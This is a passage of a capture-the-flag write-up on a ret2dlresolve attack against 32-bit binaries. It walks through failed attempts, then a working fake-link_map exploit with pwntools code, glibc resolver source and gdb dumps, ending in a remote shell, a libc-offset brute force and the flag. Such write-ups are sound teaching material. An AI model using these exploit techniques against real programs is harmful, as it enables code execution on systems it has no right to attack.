─────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x $ecx
0x80488f8:      0x05eb0000
gef➤  x/10wx $ecx
0x80488f8:      0x05eb0000      0x00033be8      0x5d8b9000      0x55c3c9fc
0x8048908:      0x8153e589      0x0000a4ec      0xfb3ae800      0xc381ffff
0x8048918:      0x000026ea      0xe031838d
```

After a lot of shifting the fake tables, we finally get a local shell!
Things to note:
    - Make sure to sleep and set context.log_level to debug to make sure you don't have buffering issues
    - Sometimes it would resolve but the index was in something vital and would result in a segfault after the symbol lookup, just try more offsets, 0's are always the best

Here's when my nightmare started, it seems that the addresses of those nulls are very random across the binaries. 
```gdb 
gef➤  x/10wx 0x80488f0
0x80488f0:      0x75c08510      0x02cee807      0x05eb0000      0x00033be8
0x8048900:      0x5d8b9000      0x55c3c9fc      0x8153e589      0x0000a4ec
0x8048910:      0xfb3ae800      0xc381ffff

=====================DIFFERENT BINARY==================================
gef➤  x/10wx 0x80488f0
0x80488f0:      0x10c483ff      0x0775c085      0x0002c8e8      0xe805eb00
0x8048900:      0x00000335      0xfc5d8b90      0x8955c3c9      0xec8353e5
0x8048910:      0xfb3ae854      0xc381ffff
```


On top of that, this section is part of the ld, so my local one may not be the same as the remote. 
Originally I was hoping that I could find a section that only had nulls as these pages usually are not all used so the end should be all null. The issue here is that our range is the BSS's range so it's somewhere between 448.
```gdb 
gef➤  x/112wx $ecx
0x80488b2:      0x04ec8310      0x458d136a      0x006a50dd      0xfffacde8
0x80488c2:      0x10c483ff      0x0044838b      0xec830000      0xcbe8500c
0x80488d2:      0x83fffffa      0xc28910c4      0x0044838b      0xec830000
0x80488e2:      0x558d5204      0xe85052dd      0xfffffaf2      0x8510c483
0x80488f2:      0xe80775c0      0x000002ce      0x3be805eb      0x90000003
0x8048902:      0xc9fc5d8b      0xe58955c3      0xa4ec8153      0xe8000000
0x8048912:      0xfffffb3a      0x26eac381      0x838d0000      0xffffe031
0x8048922:      0x83f44589      0x6a6a04ec      0x458d006a      0x9be8508a
0x8048932:      0x83fffffa      0xec8310c4      0x8d666a04      0x6a508a45
0x8048942:      0xfa48e800      0xc483ffff      0x48838b10      0x83000000
0x8048952:      0xe8500cec      0xfffffa46      0x8910c483      0x48838bc2
0x8048962:      0x83000000      0x8d5204ec      0x50528a55      0xfffa6de8
0x8048972:      0x10c483ff      0x8b90c085      0xc3c9fc5d      0x53e58955
0x8048982:      0xe834ec83      0xfffffac6      0x2676c381      0x838d0000
0x8048992:      0xffffe044      0x83f44589      0x186a04ec      0x458d006a
0x80489a2:      0x27e850dc      0x83fffffa      0xec8310c4      0x8d146a04
0x80489b2:      0x6a50dc45      0xf9d4e800      0xc483ffff      0x4c838b10
0x80489c2:      0x83000000      0xe8500cec      0xfffff9d2      0x8910c483
0x80489d2:      0x4c838bc2      0x83000000      0x8d5204ec      0x5052dc55
0x80489e2:      0xfff9f9e8      0x10c483ff      0x8b90c085      0xc3c9fc5d
0x80489f2:      0x53e58955      0xe854ec83      0xfffffa52      0x2602c381
0x8048a02:      0x838d0000      0xffffe068      0x83f44589      0x1f6a04ec
0x8048a12:      0x458d006a      0xb3e850d5      0x83fffff9      0xec8310c4
0x8048a22:      0x8d1b6a04      0x6a50d545      0xf960e800      0xc483ffff
0x8048a32:      0x50838b10      0x83000000      0xe8500cec      0xfffff95e
0x8048a42:      0x8910c483      0x50838bc2      0x83000000      0x8d5204ec
0x8048a52:      0x5052d555      0xfff985e8      0x10c483ff      0x8b90c085
0x8048a62:      0xc3c9fc5d      0x53e58955      0x0084ec81      0xdbe80000
```

After a lot of fiddling, I realized that this attempt for remote would never work so I moved on my next attempt idea. After researching for my next methods, I came across this article that explains this issue. Turns out this was a hash map index but the author used the same solution as mine.
<https://ctf--wiki-org.translate.goog/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US#partial-relro_1>(Hand Forged Stage 4)

After solving this challenge I also saw this writeup that used this method and figured out how to fix this error
<https://github.com/MooseTheGoose/ctf-writeups/tree/main/Battelle22/HolyGrailOfRop>

<h2>Attempt 2 Fake STRTAB with Link Map</h2>
This exploit attempt was a major failure but also paves the way for the final exploit method. Before DL_Resolve is called it pushes a value onto the stack. 

This value is actually the link map. It holds information that dl_resolve will use when running such as the address of symtab, strtab and jmprel. The struct is humongous but here are the ones that we care about.
```gdb 
pwndbg> dt link_map 0xf7fc2a40
link_map @ 0xf7fc2a40
    +0x0000 l_addr               : 0x0
    +0x0020 l_info               : {0x0, 0x804af10, 0x804af80, 0x804af78, 0x0, 0x804af50, 0x804af58, 0x0, 0x0, 0x0, 0x804af60, 0x804af68, 0x804af18, 0x804af20, 0x0, 0x0, 0x0, 0x804af98, 0x804afa0, 0x804afa8, 0x804af88, 0x804af70, 0x0, 0x804af90, 0x0, 0x804af28, 0x804af38, 0x804af30, 0x804af40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x804afb8, 0x804afb0, 0x0 <repeats 13 times>, 0x804afc0, 0x0 <repeats 25 times>, 0x804af48}
```

L_Info is a giant array of addresses and they can be looked up here. Most important ones include DT_STRTAB, DT_SYMTAB and DT_JMPREL. <https://docs.oracle.com/cd/E19683-01/816-1386/chapter6-42444/index.html>

`
DT_STRTAB 5
DT_SYMTAB 6
DT_JMPREL 23
`

Originally I wanted to create a fake strtab that would just point to execve. Hence I could just call the plt stub for read or something and it would resolve to execve or system.
It would involve reading in the fake link_map and calling the dl_resolve stub later. 

Could not find my POC from this but I never got this method working. In `_dl_resolve` there are two main code paths, the top ones the normal one that we usually call. However, this top path needs more values from the link map as theirs obviously more code. The issue is that link_map is huge and requires too many values that would require leaking to fake or well-calculated fake values. The whole point of using this was to avoid constructing jmptab and symtab but now those seem easier. I managed to figure out a handful of the values by setting memory breakpoints and then rewinding the program to see where they were set. Eventually, this got tiring and I decided to move on to exploit attempt 3.

```c 
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;
      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
        {
          const ElfW(Half) *vernum =
            (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
          version = &l->l_versions[ndx];
          if (version->hash == 0)
            version = NULL;
        }
      /* We need to keep the scope around so do some locking.  This is
         not necessary for objects which cannot be unloaded or when
         we are not using any threads (yet).  */
      int flags = DL_LOOKUP_ADD_DEPENDENCY;
      if (!RTLD_SINGLE_THREAD_P)
        {
          THREAD_GSCOPE_SET_FLAG ();
          flags |= DL_LOOKUP_GSCOPE_LOCK;
        }
#ifdef RTLD_ENABLE_FOREIGN_CALL
      RTLD_ENABLE_FOREIGN_CALL;
#endif
      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
                                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
      /* We are done with the global scope.  */
      if (!RTLD_SINGLE_THREAD_P)
        THREAD_GSCOPE_RESET_FLAG ();
#ifdef RTLD_FINALIZE_FOREIGN_CALL
      RTLD_FINALIZE_FOREIGN_CALL;
#endif
      /* Currently result contains the base load address (or link map)
         of the object that defines sym.  Now add in the symbol
         offset.  */
      value = DL_FIXUP_MAKE_VALUE (result,
                                   SYMBOL_ADDRESS (result, sym, false));
    }
  else
    {
      /* We already found the symbol.  The module (and therefore its load
         address) is also known.  */
      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
      result = l;
    }
```


<h2>Attempt 3 Fake Link Map</h2>

Remember that second code path in dl_resolve? It's extremely simple and only calls a single function DL_FIXUP_MAKE_VALUE. This means that fewer values in the link map will be used so we will only need to fake the important ones

```c 
(((refsym) == ((void*)0) ? 0 : (__builtin_expect (((refsym)->st_shndx == 0xfff1), 0) ? 0 : ((1) || (l) ? (l)->l_addr : 0)) + (refsym)->st_value))
```

After cleaning up the checks the return value is basically `link_map->l_addr + refsym->st_value`
We have full control of link_map and refsym so we can use this second case to resolve execve. 

If we manage to set st_value to a libc address then we can brute force libc offsets using l_addr. 

We can set the fake symtab to point to the GOT entry of __libc_start_main and l_addr to `execve - __libc_start_main's address`. Hence when they are added it should return the address of execve. This means that we do not need to set up a STRTAB or SYMTAB, we just need a jmprel

One thing to note about the link map's l_info array, it does not point to the symtab or jmprel but rather a pointer to a struct that contains a pointer as well as its identifier.

```gdb 
gef➤  x/2wx (*(link_map*)0x0804bb70).l_info[23]
0x804bbf8:      0x00000017      0x0804bbff                <==== Fake jmptab
gef➤  x/2wx (*(link_map*)0x0804bb70).l_info[6]
0x804bbf0:      0x00000006      0x0804b010                <==== Fake Symtab
gef➤  p *(Elf32_Rel*)0x0804bbff
$1 = {
  r_offset = 0xf8de3808,                                  <==== This value will be explain later
  r_info = 0x707
}
gef➤  p *(Elf32_Sym*)0x0804b010
$2 = {
  st_name = 0xf7d3e5d0,
  st_value = 0xf7cbd560,
  st_size = 0xf7d0f970,
  st_info = 0x30,
  st_other = 0x75,
  st_shndx = 0xf7e1
}
```

This means that in our link map we only need a l_addr, and l_info with strtab, symtab and jmprel pointers. Outside of the link map we need to construct the jmprel structure as well as the extra structs to point to our tables. 

```python 
def make_link_map(fake_addr, offset_2_addr):
    """
    link_map 
        l_info 

    symtab( NOT NEEDED)
    jmptab
    strtab (NOT NEEDED)
    """
    map_size =  128

    fake_link_map = b'' 
    fake_link_map += p32(offset_2_addr)

    fake_link_map += fake_link_map.ljust(0x30, b'\x00') 

    # *strtab, pointer to pointer of strtab, NOT NEEDED so put anything
    fake_link_map += p32(exe.bss()) 

    # *symtab, pointer to pointer of symtab
    fake_link_map += p32(fake_addr + map_size ) 
    fake_link_map = fake_link_map.ljust(124, b'\x00') 
    # *jmptab, pointer to pointer of jmptab
    fake_link_map += p32(fake_addr + map_size+8) 


    return fake_link_map 


fake = make_link_map(fake_link_map_addr, offset_2_addr)

# Point symtab to got -4, st_value is second field
fake += p32(6)
fake += p32(exe.got.__libc_start_main -4 )

# jmptab
fake += p32(23)
fake += p32(fake_link_map_addr + len(fake) + 4 -1)

r_info = (0 << 8) | 0x7

# r_offset is used to place the val
fake_jmprel = p32(exe.bss() - offset_2_addr) + p32(r_info)

fake += fake_jmprel
fake += b"/bin/bash"
```

One thing to note is that in them jmprel r_offset seems to be a funny value. The reason is that this address plus the offset is written to with the resolved address shortly before dl_resolve_runtime finishes. I figured this out by setting memory watchpoints 

In this example I set r_offset to 0, notice that the value in edi is the offset of the two values
```gdb 
$eax   : 0xf7e4e790  →  <execve+0> endbr32
$ebx   : 0xf7ffa000  →  0x00036f2c
$ecx   : 0x0
$edx   : 0x0
$esp   : 0x0804ba14  →   add BYTE PTR [eax], al
$ebp   : 0x0804bb70  →   xor dl, dl
$esi   : 0x7
$edi   : 0xbd230
$eip   : 0xf7fd4004  →  <_dl_fixup+372> mov DWORD PTR [edi], eax
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0804ba14│+0x0000:  add BYTE PTR [eax], al      ← $esp
0x0804ba18│+0x0004:  add BYTE PTR [eax], al
0x0804ba1c│+0x0008:  add BYTE PTR [eax], al
0x0804ba20│+0x000c:  add DWORD PTR [eax], eax
0x0804ba24│+0x0010: 0xf7ffa000  →  0x00036f2c
0x0804ba28│+0x0014:  add BYTE PTR [eax], al
0x0804ba2c│+0x0018:  xor dl, dl
0x0804ba30│+0x001c:  add BYTE PTR [eax], al
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7fd3ffc <_dl_fixup+364>  test   edx, edx
   0xf7fd3ffe <_dl_fixup+366>  jne    0xf7fd4006 <_dl_fixup+374>
   0xf7fd4000 <_dl_fixup+368>  mov    edi, DWORD PTR [esp+0x18]
 → 0xf7fd4004 <_dl_fixup+372>  mov    DWORD PTR [edi], eax
   0xf7fd4006 <_dl_fixup+374>  add    esp, 0x3c
   0xf7fd4009 <_dl_fixup+377>  pop    ebx
   0xf7fd400a <_dl_fixup+378>  pop    esi
   0xf7fd400b <_dl_fixup+379>  pop    edi
   0xf7fd400c <_dl_fixup+380>  pop    ebp
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "binary1", stopped 0xf7fd4004 in elf_machine_fixup_plt (), reason: STOPPED
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7fd4004 → elf_machine_fixup_plt(value=0xf7e4e790, reloc_addr=0xbd230, reloc=<optimized out>, sym=0x804b010 <strlen@got[plt]>, refsym=<optimized out>, t=<optimized out>, map=<optimized out>)
[#1] 0xf7fd4004 → _dl_fixup(l=0x804bb70, reloc_arg=<optimized out>)
[#2] 0xf7fd5ff4 → _dl_runtime_resolve()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x $edi
0xbd230:        Cannot access memory at address 0xbd230
```

After setting up all this magic we finally get a local shell!!


<Phase 2: Remote>
Getting everything working remote was the part that I gave up on. Locally I had a bunch of helper functions to send the inputs in but on remote, I never called them, hence I was never even hitting the buffer overflow. I assumed it was a buffering issue so tried a combination of send vs sendlines vs sleeping. I ever re-wrote how the link_map was read in to avoid a second read. After giving up and seeing how other exploits did it I realized that I never even sent the answers to the questions.

Once I figured this out I found out that my exploit was perfectly fine. Since the remote libc may be different from my local version I needed to find a GOT entry close to execve OR figure out a way to get leaks. I went with the latter. I noticed that setvbuf and puts were only 1800 off from each other. Hence I decided to just brute force this. After running for a long time I went well past this range and decided to test locally. Locally calling puts after the exploit does NOT write anything to stdout. I spent a lot of time debugging this but it seems that after stack pivot calling puts will not error but also not write anything. At this point, I was bummed out as the rest of the GOT functions were really far from puts. Then I realized that read and write were right besides each other so using write would solve all my problems.
After a bit of bruteforcing I found that write was 160 bytes after read, using this we can now do a ret2libc if we leak the GOT. Leaking the GOT libc6-i386_2.28-10_amd64. 

![image](https://user-images.githubusercontent.com/77011982/183148422-69b47c67-314e-4782-8468-e2deaa4f84cc.png)

With this, we can find the exact offset from execve and `__libc_start_main` and pop a shell!

After getting a shell we will notice that theirs a hint.txt, for some reason I could not cat this file but using base64 I could read it.

```
Congrats! You we're supposed to find this!

Here's your hint

Your binary was invoked like this

LD_PRELOAD=/lib32/libgrail.so ./bin
```

Grabbing the ld file and looking through the functions we see the holy grail. We could either call this function my leaking ld but I want to keep this a leakless exploit. We can just get a shell and then do `echo DONE>./log; exit` to fake this function.

``` 
int32_t holy_grail() __noreturn
{
    int32_t var_18 = 0;
    int32_t eax = open("./log", 2);
    ssize_t var_18_1 = write(eax, "DONE\n", strlen("DONE\n"));
    close(eax);
    exit(0x2c);
    /* no return */
}
```

Once we do this we get another binary and we just need to rinse and repeat. One thing to note is that this takes forever, it needs to exploit the binary 5 times and the process dies a lot. But after a lot of tmux spamming, I finally got the flag


![image](https://user-images.githubusercontent.com/77011982/183148462-bc435b40-ccde-4819-9921-8b83f33cdd5f.png)

`
YOU FOUND THE HOLY GRAIL!
flag{Y0u_f1g4t_w311_sir_knig4t_7461834}
`

Huge thank you to playoff-rondo for showing me this challenge was well as ~~pushing~~ encouraging me through the suffering 
Questions or feedback? Feel free to reach out sofire=bad#6525 on discord
